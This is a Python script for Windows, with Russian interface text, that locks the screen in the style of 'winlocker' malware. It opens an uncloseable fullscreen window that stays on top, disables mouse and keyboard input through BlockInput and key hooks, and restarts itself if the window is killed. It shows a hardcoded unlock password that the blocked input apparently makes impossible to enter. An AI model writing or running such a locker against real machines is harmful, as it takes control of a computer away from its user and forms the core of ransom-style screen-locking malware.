import tkinter as tk
from tkinter import messagebox
import time
import ctypes
from PIL import Image, ImageTk
import os
import sys
import keyboard  # pip install keyboard
import threading

class BlockerApp:
    def __init__(self, timeout=10, password="1234"):
        self.timeout = timeout
        self.password = password
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg="red")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Фоновое изображение
        try:
            image = Image.open("background.png")
            self.bg_image = ImageTk.PhotoImage(image)
            self.bg_label = tk.Label(self.root, image=self.bg_image)
            self.bg_label.place(relwidth=1, relheight=1)
        except:
            pass

        self.label = tk.Label(self.root, text="ПК заблокирован! Ожидайте...", font=("Arial", 20), fg="white", bg="red")
        self.label.pack(expand=True)

        self.entry = tk.Entry(self.root, show="*", font=("Arial", 16))
        self.entry.pack(pady=10)
        self.entry.place(relx=0.5, rely=0.7, anchor="center")

        self.unlock_button = tk.Button(self.root, text="Разблокировать", font=("Arial", 14), command=self.unlock, state="disabled")
        self.unlock_button.place(relx=0.5, rely=0.8, anchor="center")

        # Блокировка мыши
        try:
            ctypes.windll.user32.BlockInput(True)
        except:
            pass

        # Блокировка всех обычных клавиш в отдельном потоке
        threading.Thread(target=self.block_keys, daemon=True).start()

        # Таймер и мониторинг окна
        self.start_time = time.time()
        self.update_timer()
        self.monitor_window()

        self.root.mainloop()

    def on_closing(self):
        pass  # Запрет на закрытие окна

    def unlock(self):
        if self.entry.get() == self.password:
            ctypes.windll.user32.BlockInput(False)
            keyboard.unhook_all()
            self.root.destroy()
        else:
            messagebox.showerror("Ошибка", "Неверный пароль!")

    def update_timer(self):
        elapsed = int(time.time() - self.start_time)
        remaining = self.timeout - elapsed
        if remaining > 0:
            self.label.config(text=f"Ожидайте... {remaining} секунд")
            self.root.after(1000, self.update_timer)
        else:
            self.label.config(text="Введите пароль для разблокировки:")
            self.entry.config(state="normal")
            self.unlock_button.config(state="normal")

    def monitor_window(self):
        try:
            self.root.attributes('-topmost', True)
            self.root.update()
        except tk.TclError:
            os.execl(sys.executable, sys.executable, *sys.argv)
        self.root.after(500, self.monitor_window)

    def block_keys(self):
        """Блокируем все обычные клавиши: буквы, цифры, F1-F12, Ctrl, Alt, Shift"""
        keys = [
            "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p",
            "q","r","s","t","u","v","w","x","y","z",
            "0","1","2","3","4","5","6","7","8","9",
            "f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12",
            "shift","ctrl","alt"
        ]
        for key in keys:
            keyboard.block_key(key)

        def suppress(event):
            event.suppress = True

        keyboard.hook(suppress)

if __name__ == "__main__":
    app = BlockerApp(timeout=10, password="1234")
